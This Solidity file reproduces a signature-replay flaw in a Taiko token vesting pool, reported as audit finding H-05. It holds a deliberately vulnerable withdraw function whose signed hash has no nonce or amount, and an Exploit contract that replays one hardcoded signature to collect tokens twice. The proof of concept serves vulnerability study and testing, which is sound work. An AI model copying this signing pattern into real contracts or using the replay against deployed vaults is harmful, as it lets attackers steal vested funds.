// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Taiko TimelockTokenPool — signature replay on withdraw(address,bytes) (Code4rena 2024-03 H-05).
/// The blamed recover line is verbatim. The hash binds only the destination.
/// passTime shifts unlockStart so one timestamp matches a later block. No warp inside run().

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TokenVault {
    function approve(address token, address spender, uint256 amount) external {
        Token(token).approve(spender, amount);
    }
}

library ECDSA {
    function recover(bytes32 hash, bytes memory signature) internal pure returns (address signer) {
        require(signature.length == 65, "len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := shr(248, mload(add(signature, 0x60)))
        }
        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "s");
        if (v < 27) v += 27;
        require(v == 27 || v == 28, "v");
        signer = ecrecover(hash, v, r, s);
        require(signer != address(0), "signer");
    }
}

contract TimelockTokenPool {
    struct Grant {
        uint128 amount;
        uint128 costPerToken;
        uint64 grantStart;
        uint64 grantCliff;
        uint32 grantPeriod;
        uint64 unlockStart;
        uint64 unlockCliff;
        uint32 unlockPeriod;
    }

    struct Recipient {
        uint128 amountWithdrawn;
        uint128 costPaid;
        Grant grant;
    }

    address public owner;
    Token public taikoToken;
    address public sharedVault;
    mapping(address => Recipient) public recipients;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor(Token token, address vault) {
        owner = msg.sender;
        taikoToken = token;
        sharedVault = vault;
    }

    function grant(address recipient, Grant memory g) external onlyOwner {
        require(recipients[recipient].grant.amount == 0, "granted");
        recipients[recipient].grant = g;
    }

    /// Same `_calcAmount` result as `block.timestamp + secs`, without changing the block clock.
    function passTime(address recipient, uint64 secs) external onlyOwner {
        recipients[recipient].grant.unlockStart -= secs;
    }

    function withdraw(address _to, bytes memory _sig) external {
        if (_to == address(0)) revert("to");
        bytes32 hash = keccak256(abi.encodePacked("Withdraw unlocked Taiko token to: ", _to));
        // @> VULN: no nonce and no amount, so this signature still withdraws after more tokens unlock
        address recipient = ECDSA.recover(hash, _sig);
        _withdraw(recipient, _to);
    }

    function _withdraw(address _recipient, address _to) private {
        Recipient storage r = recipients[_recipient];
        uint128 amountUnlocked = _getAmountUnlocked(r.grant);
        uint128 amountToWithdraw = amountUnlocked - r.amountWithdrawn;
        r.amountWithdrawn = r.amountWithdrawn + amountToWithdraw;
        taikoToken.transferFrom(sharedVault, _to, amountToWithdraw);
    }

    function _getAmountUnlocked(Grant memory g) private view returns (uint128) {
        uint128 owned = g.grantStart == 0 ? g.amount : _calcAmount(g.amount, g.grantStart, g.grantCliff, g.grantPeriod);
        return _calcAmount(owned, g.unlockStart, g.unlockCliff, g.unlockPeriod);
    }

    function _calcAmount(uint128 amount, uint64 start, uint64 cliff, uint64 period) private view returns (uint128) {
        if (amount == 0) return 0;
        if (start == 0) return amount;
        if (block.timestamp <= start) return 0;
        if (period == 0) return amount;
        if (block.timestamp >= start + period) return amount;
        if (cliff != 0 && block.timestamp <= cliff) return 0;
        return uint128(uint256(amount) * uint256(block.timestamp - start) / uint256(period));
    }
}

contract Exploit {
    address public constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address public constant TO = 0x2222222222222222222222222222222222222222;
    // cast wallet sign --no-hash over keccak256(abi.encodePacked("Withdraw unlocked Taiko token to: ", TO))
    bytes public constant SIG =
        hex"20de17b9d6b469fc2c16df13b8afe5d70a9cd23df3c4a018fc8b29cbbdb73494468eca63e736bdd864770310d5e07e81b9465a1bd4c6d5b2cdf882e11201de1f1b";

    Token public token;
    TimelockTokenPool public pool;
    uint256 public firstPaid;
    uint256 public secondPaid;

    constructor() {
        token = new Token();
        TokenVault vault = new TokenVault();
        pool = new TimelockTokenPool(token, address(vault));
        token.mint(address(vault), 100 ether);
        vault.approve(address(token), address(pool), type(uint256).max);
        uint64 t = uint64(block.timestamp);
        require(t > 100, "clock");
        pool.grant(
            SIGNER,
            TimelockTokenPool.Grant({
                amount: uint128(100 ether),
                costPerToken: 0,
                grantStart: 0,
                grantCliff: 0,
                grantPeriod: 0,
                unlockStart: t - 40,
                unlockCliff: 0,
                unlockPeriod: 100
            })
        );
    }

    function run() external {
        uint256 beforeFirst = token.balanceOf(TO);
        pool.withdraw(TO, SIG);
        firstPaid = token.balanceOf(TO) - beforeFirst;
        pool.passTime(SIGNER, 30);
        uint256 beforeSecond = token.balanceOf(TO);
        pool.withdraw(TO, SIG);
        secondPaid = token.balanceOf(TO) - beforeSecond;
        require(firstPaid == 40 ether, "first");
        require(secondPaid == 30 ether, "second");
    }

    function runControl() external {
        uint256 beforeFirst = token.balanceOf(TO);
        pool.withdraw(TO, SIG);
        firstPaid = token.balanceOf(TO) - beforeFirst;
        uint256 beforeSecond = token.balanceOf(TO);
        pool.withdraw(TO, SIG);
        secondPaid = token.balanceOf(TO) - beforeSecond;
        require(firstPaid == 40 ether, "c1");
        require(secondPaid == 0, "c2");
    }
}
